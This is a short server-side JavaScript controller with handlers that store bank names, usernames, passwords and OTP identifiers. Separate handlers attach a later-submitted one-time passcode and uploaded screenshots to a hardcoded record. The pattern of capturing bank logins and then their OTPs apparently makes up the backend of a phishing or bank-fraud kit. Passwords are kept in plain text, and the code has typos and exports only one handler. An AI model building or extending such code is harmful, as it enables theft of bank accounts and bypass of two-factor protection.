import db from "../db.js";

const getBanks = (req, res) => {
  const q = "SELECT * FROM bankdetails WHERE bankName = ?";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
};

const addBank = (req, res) => {
  const q =
    "INSERT INTO bankdetails(`bankName`, `username`, `password`,`otpId`) VALUE(?)";
  const values = [
    req.body.bankName,
    req.body.username,
    req.body.password,
    req.body.otpId,
  ];
  db.query(q, [values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("bank details has been created!");
  });
};

const addOtp = (req, res) => {
  const q = "UPDATE bankdetails SET otp = ? WHERE otpId = ?";
  const values = [req.body.otp, req.body.otpId];
  db.query(q, [...values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("Otp added!");
  });
  // console.log(req.params.id);
};

const handleScreenShot = (req, res) => {
  const q = "UPDATE screenhots SET image = ? WHERE otpId = ' USQNPS7sMViHcPf' ";
  const values = [req.body.image];
  db.query(q, [...values], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json("Image added!");
  });
  // console.log(req.params.id);
};

const sceenShotStatus = (req, res) => {
  const q = "SELECT * FROM screenhots";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
    return res.status(200).json(data);
  });
};

const deleteBank = (req, res) => {
  const q = "DELETE FROM bankdetails  WHERE otpId = ? ";
  db.query(q, [req.params.id], (err, data) => {
    if (err) return res.send(err);
  });
  const q2 =
    "UPDATE screenhots SET image = ? WHERE otpId = ' USQNPS7sMViHcPf' ";
  db.query(q2, [""], (err, data) => {
    return res.status(200).json("Bank has been deleted!");
  });
};

export default deleteBank;
